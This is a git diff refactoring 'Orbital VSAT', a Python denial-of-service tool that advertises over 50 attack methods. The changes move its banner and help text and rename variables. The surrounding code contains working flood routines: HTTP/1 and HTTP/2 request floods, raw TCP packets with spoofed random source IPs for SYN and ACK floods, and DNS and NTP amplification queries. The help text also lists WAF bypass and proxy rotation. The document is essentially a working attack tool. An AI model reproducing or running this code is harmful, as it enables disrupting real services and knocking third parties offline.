@@ -18,22 +18,22 @@ try:
     import sys
     import threading
     import time
+    from config.logo import banner, helper
+    from config.color import Color
     from concurrent.futures import ThreadPoolExecutor
     from datetime import datetime
     from sys import stdout
     from time import sleep
     from urllib.parse import urlencode, urlparse
 
-    from colorama import Back, Fore, init
-
     # HTTP/2
     try:
         import h2.config
         import h2.connection
 
-        HAS_H2 = True
+        HasH2 = True
     except ImportError:
-        HAS_H2 = False
+        HasH2 = False
 
     # HTTP/3
     try:
@@ -43,17 +43,15 @@ try:
         from aioquic.h3.connection import H3_ALPN
         from aioquic.quic.configuration import QuicConfiguration
 
-        HAS_H3 = True
+        HasH3 = True
     except ImportError:
-        HAS_H3 = False
+        HasH3 = False
 
 except ModuleNotFoundError as e:
     print(
-        f"{Fore.YELLOW}[{Fore.RED} WARNING {Fore.YELLOW}]: {Fore.RED} MODULE NOT INSTALLED {Fore.GREEN} {e} {Fore.RESET}"
+        f"{Color.orange}[{Color.red} WARNING {Color.orange}]: {Color.red} MODULE NOT INSTALLED {Color.darkgreen} {e} {Color.reset}"
     )
     sys.exit(1)
-
-init(autoreset=True)
 
 
 def clear():
@@ -69,109 +67,6 @@ def animx(text):
 
 
 now = datetime.now()
-
-banner = f"""
-    {Fore.RED}
-    {Back.BLACK}
-        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-        //                                                                                                                                                        //
-        //     ███████    ███████████   ███████████  █████ ███████████   █████████   █████          █████   █████     █████████       █████████      ███████████  //
-        //   ███░░░░░███ ░░███░░░░░███ ░░███░░░░░███░░███ ░█░░░███░░░█  ███░░░░░███ ░░███          ░░███   ░░███     ███░░░░░███     ███░░░░░███    ░█░░░███░░░█  //
-        //  ███     ░░███ ░███    ░███  ░███    ░███ ░███ ░   ░███  ░  ░███    ░███  ░███           ░███    ░███    ░███    ░░░     ░███    ░███    ░   ░███  ░   //
-        // ░███      ░███ ░██████████   ░██████████  ░███     ░███     ░███████████  ░███           ░███    ░███    ░░█████████     ░███████████        ░███      //
-        // ░███      ░███ ░███░░░░░███  ░███░░░░░███ ░███     ░███     ░███░░░░░███  ░███           ░░███   ███      ░░░░░░░░███    ░███░░░░░███        ░███      //
-        // ░░███     ███  ░███    ░███  ░███    ░███ ░███     ░███     ░███    ░███  ░███      █     ░░░█████░       ███    ░███    ░███    ░███        ░███      //
-        //  ░░░███████░   █████   █████ ███████████  █████    █████    █████   █████ ███████████       ░░███      ██░░█████████  ██ █████   █████ ██    █████     //
-        //    ░░░░░░░    ░░░░░   ░░░░░ ░░░░░░░░░░░  ░░░░░    ░░░░░    ░░░░░   ░░░░░ ░░░░░░░░░░░         ░░░      ░░  ░░░░░░░░░  ░░ ░░░░░   ░░░░░ ░░    ░░░░░      //
-        //                                                             ORBITAL VOLUMETRIC SHOCKWAVES ARTILLERY                                                    //
-        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-    {Back.RESET}
-
-    {Fore.GREEN}    ORBITAL VOLUMETRIC SHOCKWAVES ARTILLERY
-
-    {Fore.YELLOW}[{Fore.RED}I{Fore.YELLOW}] {Fore.MAGENTA} INFORMATIONS:
-        {Fore.GREEN} Author           \t: {Fore.WHITE} 0xTM7
-        {Fore.GREEN} GitHub           \t: {Fore.WHITE} @0xTM7 | https://github.com/0xTM7
-        {Fore.GREEN} Version          \t: {Fore.WHITE} VSAT.2.0
-        {Fore.GREEN} Release          \t: {Fore.WHITE} APRIL 13 2026
-        {Fore.GREEN} Today            \t: {Fore.WHITE} {now.strftime("%Y-%m-%d %H:%M:%S")}
-
-        {Fore.GREEN} HTTP/2           \t: {Fore.WHITE} {"✓ Enabled" if HAS_H2 else "✗ Install h2"}
-        {Fore.GREEN} HTTP/3           \t: {Fore.WHITE} {"✓ Enabled" if HAS_H3 else "✗ Install aioquic"}
-        {Fore.GREEN} Methods          \t: {Fore.WHITE} 50+ Attack Vectors
-        {Fore.MAGENTA}[{Fore.CYAN} INFO {Fore.MAGENTA}] {Fore.BLUE} TYPE 'helper' TO SEE TOOLS HELP.
-    {Fore.RESET}
-"""
-
-helper = f"""
-    {Fore.YELLOW}[{Fore.RED}M{Fore.YELLOW}]: {Fore.CYAN} Available Methods:
-        {Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}] {Fore.MAGENTA} LAYER 7: {Fore.WHITE} APPLICATION
-            {Fore.MAGENTA}     ->{Fore.WHITE} GET                   \t: {Fore.GREEN} HTTP GET Flood With Cache Bypass
-            {Fore.MAGENTA}     ->{Fore.WHITE} POST                  \t: {Fore.GREEN} HTTP POST Flood [ 64KB Payloads ]
-            {Fore.MAGENTA}     ->{Fore.WHITE} PUT                   \t: {Fore.GREEN} HTTP PUT Flood
-            {Fore.MAGENTA}     ->{Fore.WHITE} HEAD                  \t: {Fore.GREEN} HTTP HEAD Flood
-            {Fore.MAGENTA}     ->{Fore.WHITE} DELETE                   \t: {Fore.GREEN} HTTP DELETE Flood
-            {Fore.MAGENTA}     ->{Fore.WHITE} PATCH                 \t: {Fore.GREEN} HTTP PATCH Flood
-            {Fore.MAGENTA}     ->{Fore.WHITE} OPTIONS                   \t: {Fore.GREEN} HTTP OPTIONS Flood
-
-        {Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}]{Fore.MAGENTA} LAYER 7: {Fore.WHITE} ADVANCED METHODS
-            {Fore.MAGENTA}     ->{Fore.WHITE} XMLRPC                    \t: {Fore.GREEN} XML-RPC Pingback attack
-            {Fore.MAGENTA}     ->{Fore.WHITE} RANDOM                    \t: {Fore.GREEN} Random HTTP Methods Flood
-            {Fore.MAGENTA}     ->{Fore.WHITE} SLOWLORIS                 \t: {Fore.GREEN} Slowloris Attack [ Keep Alive ]
-            {Fore.MAGENTA}     ->{Fore.WHITE} SLOW-POST                 \t: {Fore.GREEN} Slow-POST Body Attack
-            {Fore.MAGENTA}     ->{Fore.WHITE} CACHE                 \t: {Fore.GREEN} Cache Bypass Flood
-            {Fore.MAGENTA}     ->{Fore.WHITE} BYPASS                    \t: {Fore.GREEN} WAF Bypass Techniques
-            {Fore.MAGENTA}     ->{Fore.WHITE} CONNECT                   \t: {Fore.GREEN} HTTP CONNECT Flood
-            {Fore.MAGENTA}     ->{Fore.WHITE} TRACE                 \t: {Fore.GREEN} HTTP TRACE Flood
-            {Fore.MAGENTA}     ->{Fore.WHITE} SLOW-READ                 \t: {Fore.GREEN} Slow-READ Body Attack
-            {Fore.MAGENTA}     ->{Fore.WHITE} RUDY                  \t: {Fore.GREEN} ARE-YOU-DEAD-YET Attack
-
-        {Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}]{Fore.MAGENTA} LAYER 7: {Fore.WHITE} HTTP/2 | HTTP/3
-            {Fore.MAGENTA}     ->{Fore.WHITE} H2-GET                    \t: {Fore.GREEN} HTTP/2 GET With Priority
-            {Fore.MAGENTA}     ->{Fore.WHITE} H2-POST                   \t: {Fore.GREEN} HTTP/2 POST With Multiplexing
-            {Fore.MAGENTA}     ->{Fore.WHITE} H2-RAPID                  \t: {Fore.GREEN} HTTP/2 RAPID Reset
-            {Fore.MAGENTA}     ->{Fore.WHITE} H2-PING                   \t: {Fore.GREEN} HTTP/2 PING Flood
-            {Fore.MAGENTA}     ->{Fore.WHITE} H3-GET                    \t: {Fore.GREEN} HTTP/3 QUIC GET
-            {Fore.MAGENTA}     ->{Fore.WHITE} H3-POST                   \t: {Fore.GREEN} HTTP/3 QUIC POST
-
-        {Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}]{Fore.MAGENTA} LAYER 4: {Fore.WHITE} TRANSPORT
-            {Fore.MAGENTA}     ->{Fore.WHITE} TCP                   \t: {Fore.GREEN} TCP Connection Flood
-            {Fore.MAGENTA}     ->{Fore.WHITE} UDP                   \t: {Fore.GREEN} UDP Packet Flood [ 64KB Payloads ]
-            {Fore.MAGENTA}     ->{Fore.WHITE} SYN                   \t: {Fore.GREEN} TCP SYN Flood {Fore.MAGENTA} [{Fore.WHITE} REQUIRES ROOT {Fore.MAGENTA}]
-            {Fore.MAGENTA}     ->{Fore.WHITE} ACK                   \t: {Fore.GREEN} TCP ACK Flood {Fore.MAGENTA} [{Fore.WHITE} REQUIRES ROOT {Fore.MAGENTA}]
-            {Fore.MAGENTA}     ->{Fore.WHITE} RST                   \t: {Fore.GREEN} TCP RST Flood {Fore.MAGENTA} [{Fore.WHITE} REQUIRES ROOT {Fore.MAGENTA}]
-            {Fore.MAGENTA}     ->{Fore.WHITE} FIN                   \t: {Fore.GREEN} TCP FIN Flood {Fore.MAGENTA} [{Fore.WHITE} REQUIRES ROOT {Fore.MAGENTA}]
-            {Fore.MAGENTA}     ->{Fore.WHITE} SYNACK                    \t: {Fore.GREEN} TCP SYN-ACK Reflection
-            {Fore.MAGENTA}     ->{Fore.WHITE} PSH                   \t: {Fore.GREEN} TCP PSH + ACK Flood
-            {Fore.MAGENTA}     ->{Fore.WHITE} URG                   \t: {Fore.GREEN} TCP URG Flood
-            {Fore.MAGENTA}     ->{Fore.WHITE} XMAS                  \t: {Fore.GREEN} TCP XMAS SCAN Flood
-            {Fore.MAGENTA}     ->{Fore.WHITE} NULL                  \t: {Fore.GREEN} TCP NULL SCAN Flood
-
-        {Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}]{Fore.MAGENTA} LAYER 4: {Fore.WHITE} AMPLIFICATIONS
-            {Fore.MAGENTA}     ->{Fore.WHITE} UDP-FRAG                  \t: {Fore.GREEN} UDP FRAGMENTATION Flood
-            {Fore.MAGENTA}     ->{Fore.WHITE} DNS-AMP                   \t: {Fore.GREEN} DNS AMPLIFICATION
-            {Fore.MAGENTA}     ->{Fore.WHITE} NTP-AMP                   \t: {Fore.GREEN} NTP AMPLIFICATION
-            {Fore.MAGENTA}     ->{Fore.WHITE} SSDP-AMP                  \t: {Fore.GREEN} SSDP AMPLIFICATION
-            {Fore.MAGENTA}     ->{Fore.WHITE} MEMCACHED                 \t: {Fore.GREEN} MEMCACHED AMPLIFICATION
-            {Fore.MAGENTA}     ->{Fore.WHITE} CHARGEN                   \t: {Fore.GREEN} CHARGEN AMPLIFICATION
-
-        {Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}]{Fore.MAGENTA} LAYER 3: {Fore.WHITE} NETWORKS
-            {Fore.MAGENTA}     ->{Fore.WHITE} ICMP                  \t: {Fore.GREEN} ICMP Ping Flood {Fore.MAGENTA} [{Fore.WHITE} REQUIRES ROOT {Fore.MAGENTA}]
-            {Fore.MAGENTA}     ->{Fore.WHITE} PING                  \t: {Fore.GREEN} PING Flood
-            {Fore.MAGENTA}     ->{Fore.WHITE} SMURF                 \t: {Fore.GREEN} SMURF Attack
-            {Fore.MAGENTA}     ->{Fore.WHITE} FRAGGLE                   \t: {Fore.GREEN} FRAGGLE Attack [ UDP + ECHO ]
-
-    {Fore.YELLOW}[{Fore.RED}C{Fore.YELLOW}]: {Fore.CYAN} Configuration Supports:
-            {Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}]: {Fore.MAGENTA} User-Agent Headers Randomization
-            {Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}]: {Fore.MAGENTA} Proxy Address Randomization/Proxychaining
-            {Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}]: {Fore.MAGENTA} Referers Randomization/Requests Sources Randomization
-            {Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}]: {Fore.MAGENTA} HTTP1 | HTTP2 | HTTP3 Configurations Support
-            {Fore.YELLOW}[{Fore.RED}+{Fore.YELLOW}]: {Fore.MAGENTA} Autofingerprinting JA3, TLS, Browser Like Requests [ chrome | firefox | safari ]
-
-    {Fore.YELLOW}[{Fore.RED}EXIT{Fore.YELLOW}]: {Fore.RED} CTRL + C To Stop.
-
-{Fore.RESET}
-"""
 
 # JA3 Profiles
 JA3Profiles = {
@@ -229,12 +124,12 @@ class OrbitalVSAT:
         self.protocol = "h1"
         self.clusterMode = False
         self.processes = mp.cpu_count()
-        self.ja3profile = "chrome"
+        self.jaProfile = "chrome"
         self.running = mp.Value("i", 0)
         self.requestsCount = mp.Value("i", 0)
         self.bytesSent = mp.Value("i", 0)
         self.statsLock = mp.Lock()
-        self.default_ua = [
+        self.defaultUA = [
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/140.0.0.0",
             "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/140.0.0.0",
         ]
@@ -274,33 +169,33 @@ class OrbitalVSAT:
             self.ip = socket.gethostbyname(self.host)
         except Exception:
             animx(
-                f"{Fore.YELLOW}[{Fore.RED} ERROR {Fore.YELLOW}]: {Fore.MAGENTA} CANNOT RESOLVE: {Fore.RED} {self.host} {Fore.RESET}"
+                f"{Color.orange}[{Color.red} ERROR {Color.orange}]: {Color.white} CANNOT RESOLVE: {Color.red} {self.host} {Color.reset}"
             )
             raise
-        self.useragents = self.docloader("UA.txt", self.default_ua)
+        self.useragents = self.docloader("UA.txt", self.defaultUA)
         animx(
-            f"{Fore.MAGENTA}[{Fore.CYAN} INFO {Fore.MAGENTA}] {Fore.BLUE} TARGET: {Fore.MAGENTA} {self.target} {Fore.RESET}"
+            f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} TARGET: {Color.white} {self.target} {Color.reset}"
         )
         animx(
-            f"{Fore.MAGENTA}[{Fore.CYAN} INFO {Fore.MAGENTA}] {Fore.BLUE} IP ADDRESS: {Fore.MAGENTA} {self.ip}:{self.port} {Fore.RESET}"
+            f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} IP ADDRESS: {Color.white} {self.ip}:{self.port} {Color.reset}"
         )
         animx(
-            f"{Fore.MAGENTA}[{Fore.CYAN} INFO {Fore.MAGENTA}] {Fore.BLUE} METHODS: {Fore.MAGENTA} {self.method} {Fore.RESET}"
+            f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} METHODS: {Color.white} {self.method} {Color.reset}"
         )
         animx(
-            f"{Fore.MAGENTA}[{Fore.CYAN} INFO {Fore.MAGENTA}] {Fore.BLUE} PROTOCOL: {Fore.MAGENTA} {self.protocol.upper()} {Fore.RESET}"
+            f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} PROTOCOL: {Color.white} {self.protocol.upper()} {Color.reset}"
         )
         animx(
-            f"{Fore.MAGENTA}[{Fore.CYAN} INFO {Fore.MAGENTA}] {Fore.BLUE} JA3 Fingerprint: {Fore.MAGENTA} {self.ja3profile} {Fore.RESET}"
+            f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} JA3 Fingerprint: {Color.white} {self.jaProfile} {Color.reset}"
         )
 
         if self.clusterMode:
             animx(
-                f"{Fore.MAGENTA}[{Fore.CYAN} INFO {Fore.MAGENTA}] {Fore.BLUE} CLUSTER: {Fore.MAGENTA} {self.processes} {Fore.BLUE} CORES x: {Fore.MAGENTA} {self.processes * self.threads} {Fore.GREEN} THREADS. {Fore.RESET}"
+                f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} CLUSTER: {Color.white} {self.processes} {Color.cyan} CORES x: {Color.white} {self.processes * self.threads} {Color.darkgreen} THREADS. {Color.reset}"
             )
 
     def getCipherNames(self, cipher_codes):
-        cipher_map = {
+        ChiperList = {
             0x1301: "TLS_AES_128_GCM_SHA256",
             0x1302: "TLS_AES_256_GCM_SHA384",
             0x1303: "TLS_CHACHA20_POLY1305_SHA256",
@@ -311,7 +206,7 @@ class OrbitalVSAT:
             0xCCA9: "ECDHE-ECDSA-CHACHA20-POLY1305",
             0xCCA8: "ECDHE-RSA-CHACHA20-POLY1305",
         }
-        return [cipher_map.get(c, "") for c in cipher_codes[:8] if c in cipher_map] or [
+        return [ChiperList.get(c, "") for c in cipher_codes[:8] if c in ChiperList] or [
             "ECDHE+AESGCM"
         ]
 
@@ -328,7 +223,7 @@ class OrbitalVSAT:
                 context.check_hostname = False
                 context.verify_mode = ssl.CERT_NONE
                 context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
-                profile = JA3Profiles[self.ja3profile]
+                profile = JA3Profiles[self.jaProfile]
                 cipherNames = self.getCipherNames(profile["ciphers"])
                 try:
                     context.set_ciphers(":".join(cipherNames))
@@ -441,7 +336,7 @@ class OrbitalVSAT:
                     connections.remove(sock)
             sleep(10)
 
-    def slow_postExecutor(self, executorId):
+    def slowPostExecutor(self, executorId):
         """Slow POST Attack"""
         connections = []
         for _ in range(100):
@@ -465,7 +360,7 @@ class OrbitalVSAT:
 
     def h2Executor(self, executorId):
         """HTTP/2 Worker With Priority"""
-        if not HAS_H2:
+        if not HasH2:
             return
         localCount = 0
         localBytes = 0
@@ -484,30 +379,28 @@ class OrbitalVSAT:
                 h2Connection.initiate_connection()
                 h2Connection.increment_flow_control_window(15663105)
                 sock.sendall(h2Connection.data_to_send())
-                for stream_id in range(1, 513, 2):
+                for StreamId in range(1, 513, 2):
                     if not self.running.value:
                         break
                     try:
-                        h2Connection.prioritize(
-                            stream_id, weight=random.randint(1, 256)
-                        )
+                        h2Connection.prioritize(StreamId, weight=random.randint(1, 256))
                         headers = [
                             (":method", "POST" if "POST" in self.method else "GET"),
                             (":scheme", self.scheme),
                             (":authority", self.host),
                             (
                                 ":path",
-                                f"{self.path}?s={stream_id}&_{int(time.time() * 1000000)}",
+                                f"{self.path}?s={StreamId}&_{int(time.time() * 1000000)}",
                             ),
                             ("user-agent", random.choice(self.useragents)),
                         ]
-                        h2Connection.send_headers(stream_id, headers)
+                        h2Connection.send_headers(StreamId, headers)
                         if "POST" in self.method:
                             body = os.urandom(65536)
-                            h2Connection.send_data(stream_id, body)
+                            h2Connection.send_data(StreamId, body)
                             localBytes += len(body)
-                        h2Connection.end_stream(stream_id)
-                        if stream_id % 32 == 1:
+                        h2Connection.end_stream(StreamId)
+                        if StreamId % 32 == 1:
                             data = h2Connection.data_to_send()
                             if data:
                                 sock.sendall(data)
@@ -535,9 +428,9 @@ class OrbitalVSAT:
                     except Exception:
                         pass
 
-    def h2_pingExecutor(self, executorId):
+    def h2PingExecutor(self, executorId):
         """HTTP/2 PING Flood"""
-        if not HAS_H2:
+        if not HasH2:
             return
 
         while self.running.value:
@@ -594,8 +487,8 @@ class OrbitalVSAT:
             return
         while self.running.value:
             try:
-                src_ip = self.randip()
-                ip_h = struct.pack(
+                SourceIP = self.randip()
+                IPHeader = struct.pack(
                     "!BBHHHBBH4s4s",
                     69,
                     0,
@@ -605,10 +498,10 @@ class OrbitalVSAT:
                     64,
                     socket.IPPROTO_TCP,
                     0,
-                    socket.inet_aton(src_ip),
+                    socket.inet_aton(SourceIP),
                     socket.inet_aton(self.ip),
                 )
-                tcp_h = struct.pack(
+                TCPHeader = struct.pack(
                     "!HHLLBBHHH",
                     random.randint(1024, 65535),
                     self.port,
@@ -620,7 +513,7 @@ class OrbitalVSAT:
                     0,
                     0,
                 )
-                sock.sendto(ip_h + tcp_h, (self.ip, 0))
+                sock.sendto(IPHeader + TCPHeader, (self.ip, 0))
                 with self.statsLock:
                     self.requestsCount.value += 1
             except Exception:
@@ -634,8 +527,8 @@ class OrbitalVSAT:
             return
         while self.running.value:
             try:
-                src_ip = self.randip()
-                ip_h = struct.pack(
+                SourceIP = self.randip()
+                IPHeader = struct.pack(
                     "!BBHHHBBH4s4s",
                     69,
                     0,
@@ -645,10 +538,10 @@ class OrbitalVSAT:
                     64,
                     socket.IPPROTO_TCP,
                     0,
-                    socket.inet_aton(src_ip),
+                    socket.inet_aton(SourceIP),
                     socket.inet_aton(self.ip),
                 )
-                tcp_h = struct.pack(
+                TCPHeader = struct.pack(
                     "!HHLLBBHHH",
                     random.randint(1024, 65535),
                     self.port,
@@ -660,7 +553,7 @@ class OrbitalVSAT:
                     0,
                     0,
                 )
-                sock.sendto(ip_h + tcp_h, (self.ip, 0))
+                sock.sendto(IPHeader + TCPHeader, (self.ip, 0))
 
                 with self.statsLock:
                     self.requestsCount.value += 1
@@ -675,8 +568,8 @@ class OrbitalVSAT:
             return
         while self.running.value:
             try:
-                src_ip = self.randip()
-                ip_h = struct.pack(
+                SourceIP = self.randip()
+                IPHeader = struct.pack(
                     "!BBHHHBBH4s4s",
                     69,
                     0,
@@ -686,10 +579,10 @@ class OrbitalVSAT:
                     64,
                     socket.IPPROTO_TCP,
                     0,
-                    socket.inet_aton(src_ip),
+                    socket.inet_aton(SourceIP),
                     socket.inet_aton(self.ip),
                 )
-                tcp_h = struct.pack(
+                TCPHeader = struct.pack(
                     "!HHLLBBHHH",
                     random.randint(1024, 65535),
                     self.port,
@@ -701,7 +594,7 @@ class OrbitalVSAT:
                     0,
                     0,
                 )
-                sock.sendto(ip_h + tcp_h, (self.ip, 0))
+                sock.sendto(IPHeader + TCPHeader, (self.ip, 0))
                 with self.statsLock:
                     self.requestsCount.value += 1
             except Exception:
@@ -715,8 +608,8 @@ class OrbitalVSAT:
             return
         while self.running.value:
             try:
-                src_ip = self.randip()
-                ip_h = struct.pack(
+                SourceIP = self.randip()
+                IPHeader = struct.pack(
                     "!BBHHHBBH4s4s",
                     69,
                     0,
@@ -726,10 +619,10 @@ class OrbitalVSAT:
                     64,
                     socket.IPPROTO_TCP,
                     0,
-                    socket.inet_aton(src_ip),
+                    socket.inet_aton(SourceIP),
                     socket.inet_aton(self.ip),
                 )
-                tcp_h = struct.pack(
+                TCPHeader = struct.pack(
                     "!HHLLBBHHH",
                     random.randint(1024, 65535),
                     self.port,
@@ -741,7 +634,7 @@ class OrbitalVSAT:
                     0,
                     0,
                 )
-                sock.sendto(ip_h + tcp_h, (self.ip, 0))
+                sock.sendto(IPHeader + TCPHeader, (self.ip, 0))
                 with self.statsLock:
                     self.requestsCount.value += 1
             except Exception:
@@ -755,8 +648,8 @@ class OrbitalVSAT:
             return
         while self.running.value:
             try:
-                src_ip = self.randip()
-                ip_h = struct.pack(
+                SourceIP = self.randip()
+                IPHeader = struct.pack(
                     "!BBHHHBBH4s4s",
                     69,
                     0,
@@ -766,10 +659,10 @@ class OrbitalVSAT:
                     64,
                     socket.IPPROTO_TCP,
                     0,
-                    socket.inet_aton(src_ip),
+                    socket.inet_aton(SourceIP),
                     socket.inet_aton(self.ip),
                 )
-                tcp_h = struct.pack(
+                TCPHeader = struct.pack(
                     "!HHLLBBHHH",
                     random.randint(1024, 65535),
                     self.port,
@@ -781,7 +674,7 @@ class OrbitalVSAT:
                     0,
                     0,
                 )
-                sock.sendto(ip_h + tcp_h, (self.ip, 0))
+                sock.sendto(IPHeader + TCPHeader, (self.ip, 0))
                 with self.statsLock:
                     self.requestsCount.value += 1
             except Exception:
@@ -809,7 +702,7 @@ class OrbitalVSAT:
             except Exception:
                 pass
 
-    def udp_fragExecutor(self, executorId):
+    def udpFragExecutor(self, executorId):
         """UDP Fragmentation Flood"""
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
@@ -823,7 +716,7 @@ class OrbitalVSAT:
             except Exception:
                 pass
 
-    def dns_ampExecutor(self, executorId):
+    def dnsAmpExecutor(self, executorId):
         """DNS Amplification"""
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         dnsQuery = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
@@ -836,7 +729,7 @@ class OrbitalVSAT:
             except Exception:
                 pass
 
-    def ntp_ampExecutor(self, executorId):
+    def ntpAmpExecutor(self, executorId):
         """NTP Amplification"""
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         ntp_query = b"\x17\x00\x03\x2a" + b"\x00" * 4
@@ -899,10 +792,10 @@ class OrbitalVSAT:
             "TRACE": self.httpExecutor,
             "RANDOM": self.httpExecutor,
             "SLOWLORIS": self.slowlorisExecutor,
-            "SLOW-POST": self.slow_postExecutor,
+            "SLOW-POST": self.slowPostExecutor,
             "H2-GET": self.h2Executor,
             "H2-POST": self.h2Executor,
-            "H2-PING": self.h2_pingExecutor,
+            "H2-PING": self.h2PingExecutor,
             "TCP": self.tcpExecutor,
             "SYN": self.synExecutor,
             "ACK": self.ackExecutor,
@@ -910,9 +803,9 @@ class OrbitalVSAT:
             "FIN": self.finExecutor,
             "XMAS": self.xmasExecutor,
             "UDP": self.udpExecutor,
-            "UDP-FRAG": self.udp_fragExecutor,
-            "DNS-AMP": self.dns_ampExecutor,
-            "NTP-AMP": self.ntp_ampExecutor,
+            "UDP-FRAG": self.udpFragExecutor,
+            "DNS-AMP": self.dnsAmpExecutor,
+            "NTP-AMP": self.ntpAmpExecutor,
             "ICMP": self.icmpExecutor,
         }
         ThreadsExecutor = methodOptions.get(self.method, self.httpExecutor)
@@ -923,12 +816,10 @@ class OrbitalVSAT:
 
     def statsExecutor(self):
         """Stats Display"""
-        start = time.time()
         lastCount = 0
         lastBytes = 0
         while self.running.value:
             sleep(1)
-            elapsed = time.time() - start
             with self.statsLock:
                 count = self.requestsCount.value
                 totalBytes = self.bytesSent.value
@@ -939,7 +830,7 @@ class OrbitalVSAT:
             lastCount = count
             lastBytes = totalBytes
             print(
-                f"{Fore.MAGENTA}[{Fore.CYAN} INFO {Fore.MAGENTA}] {Fore.CYAN} REQUESTS: {Fore.LIGHTGREEN_EX}[{Fore.LIGHTRED_EX} {count:,} {Fore.LIGHTGREEN_EX}] {Fore.MAGENTA} TARGET: {Fore.GREEN} {self.host} {Fore.MAGENTA} METHODS: {Fore.GREEN} {self.method} {Fore.MAGENTA} IP: {Fore.GREEN} {self.ip}:{self.port} {Fore.MAGENTA} RPS: {Fore.GREEN} {rps:,} {Fore.MAGENTA} BW: {Fore.GREEN} {mbps:.1f} Mbps {Fore.RESET}"
+                f"{Color.white}[{Color.cyan} INFO {Color.white}] {Color.cyan} REQUESTS: {Color.green}[{Color.red} {count:,} {Color.green}] {Color.white} TARGET: {Color.darkgreen} {self.host} {Color.white} METHODS: {Color.darkgreen} {self.method} {Color.white} IP: {Color.darkgreen} {self.ip}:{self.port} {Color.white} RPS: {Color.darkgreen} {rps:,} {Color.white} BW: {Color.darkgreen} {mbps:.1f} Mbps {Color.reset}"
             )
 
     def start(self):
@@ -948,11 +839,11 @@ class OrbitalVSAT:
         except Exception:
             return
         self.running.value = 1
-        animx(f"\n{Fore.GREEN} {'=' * 100}")
+        animx(f"\n{Color.darkgreen} {'=' * 100}")
         animx(
-            f"{Fore.CYAN}[{Fore.RED} ORBITAL VSAT {Fore.CYAN}] {Fore.BLUE} STARTING ATTACK {Fore.YELLOW} {self.method} {Fore.RESET}"
+            f"{Color.cyan}[{Color.red} ORBITAL VSAT {Color.cyan}] {Color.cyan} STARTING ATTACK {Color.orange} {self.method} {Color.reset}"
         )
-        animx(f"{Fore.GREEN} {'=' * 100}\n")
+        animx(f"{Color.darkgreen} {'=' * 100}\n")
         statsThread = threading.Thread(target=self.statsExecutor, daemon=True)
         statsThread.start()
         if self.clusterMode:
@@ -963,7 +854,7 @@ class OrbitalVSAT:
                 processes.append(p)
                 sleep(0.02)
             animx(
-                f"{Fore.CYAN}[{Fore.RED} ORBITAL VSAT {Fore.CYAN}] {Fore.BLUE} CLUSTER: {Fore.YELLOW} {self.processes * self.threads} {Fore.YELLOW} THREADS ACTIVE!\n {Fore.RESET}"
+                f"{Color.cyan}[{Color.red} ORBITAL VSAT {Color.cyan}] {Color.cyan} CLUSTER: {Color.orange} {self.processes * self.threads} {Color.orange} THREADS ACTIVE!\n {Color.reset}"
             )
             try:
                 sleep(self.duration)
@@ -987,10 +878,10 @@ class OrbitalVSAT:
                 "TRACE": self.httpExecutor,
                 "RANDOM": self.httpExecutor,
                 "SLOWLORIS": self.slowlorisExecutor,
-                "SLOW-POST": self.slow_postExecutor,
+                "SLOW-POST": self.slowPostExecutor,
                 "H2-GET": self.h2Executor,
                 "H2-POST": self.h2Executor,
-                "H2-PING": self.h2_pingExecutor,
+                "H2-PING": self.h2PingExecutor,
                 "TCP": self.tcpExecutor,
                 "SYN": self.synExecutor,
                 "ACK": self.ackExecutor,
@@ -998,9 +889,9 @@ class OrbitalVSAT:
                 "FIN": self.finExecutor,
                 "XMAS": self.xmasExecutor,
                 "UDP": self.udpExecutor,
-                "UDP-FRAG": self.udp_fragExecutor,
-                "DNS-AMP": self.dns_ampExecutor,
-                "NTP-AMP": self.ntp_ampExecutor,
+                "UDP-FRAG": self.udpFragExecutor,
+                "DNS-AMP": self.dnsAmpExecutor,
+                "NTP-AMP": self.ntpAmpExecutor,
                 "ICMP": self.icmpExecutor,
             }
             ThreadsExecutor = methodOptions.get(self.method, self.httpExecutor)
@@ -1009,7 +900,7 @@ class OrbitalVSAT:
                     executor.submit(ThreadsExecutor, i) for i in range(self.threads)
                 ]
                 animx(
-                    f"{Fore.CYAN}[{Fore.RED} ORBITAL VSAT {Fore.CYAN}] {Fore.BLUE} RUNNING: {Fore.YELLOW} {self.threads} {Fore.YELLOW} THREADS!\n {Fore.RESET}"
+                    f"{Color.cyan}[{Color.red} ORBITAL VSAT {Color.cyan}] {Color.cyan} RUNNING: {Color.orange} {self.threads} {Color.orange} THREADS!\n {Color.reset}"
                 )
                 try:
                     sleep(self.duration)
@@ -1021,52 +912,52 @@ class OrbitalVSAT:
             finalCount = self.requestsCount.value
             finalBytes = self.bytesSent.value
         animx(
-            f"{Fore.CYAN}[{Fore.RED} ORBITAL VSAT {Fore.CYAN}] {Fore.BLUE} FINAL RESULTS {Fore.RESET}"
+            f"{Color.cyan}[{Color.red} ORBITAL VSAT {Color.cyan}] {Color.cyan} FINAL RESULTS {Color.reset}"
         )
-        animx(f"{Fore.GREEN} {'=' * 100}")
+        animx(f"{Color.darkgreen} {'=' * 100}")
         animx(
